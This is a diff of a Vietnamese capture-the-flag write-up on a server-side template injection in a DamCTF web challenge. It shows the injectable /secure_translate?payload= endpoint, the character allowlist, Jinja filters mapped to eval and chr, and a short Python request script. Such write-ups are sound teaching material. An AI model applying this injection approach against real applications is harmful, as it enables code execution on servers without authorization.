@@ -32,7 +32,7 @@ from filters import *
 ![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/7.png)
 và đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/filters.py` để đọc tệp __filters.py__
 ![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/8.png)
-</br>tóm tắt là tại path __/secure_translate__ chỉ cần chèn payload vào parameter __?payload=__ thì ta sẽ thấy web bị lỗi ssti, chỉ có một vài  ký tự được cho phép còn lại đều bị chặn
+</br>tóm tắt là chỉ cần chèn payload vào __/secure_translate?payload=__ để tấn công ssti và chỉ có một số ký tự được cho phép còn lại đều bị chặn
 ```  
 allowlist = [
         "c", "{","}","d","6","l","(","b","o","r",")",'"',"1","4","+","h","u","-","*","e","|","'",
@@ -51,7 +51,7 @@ server.jinja_env.filters["order"] = order
 server.jinja_env.filters["ch"] = character
 server.jinja_env.filters["e"] = e
 ```
-tóm gọn là hàm e là __eval__ và hàm ch là __chr__, ta sẽ quan tâm một xíu ở hàm e (đọc file filters.py)
+tóm gọn là ý nghĩa rằng hàm e là __eval__ và hàm ch là __chr__, ta sẽ quan tâm một xíu ở hàm e (đọc file filters.py)
 ```
 def e(x):
     # Security analysts reviewed this and said eval is unsafe (haters).
@@ -87,4 +87,3 @@ url = 'https://super-secure-translation-implementation.chals.damctf.xyz/secure_t
 res = s.get(url).text
 print(res)
 ```
-</br>
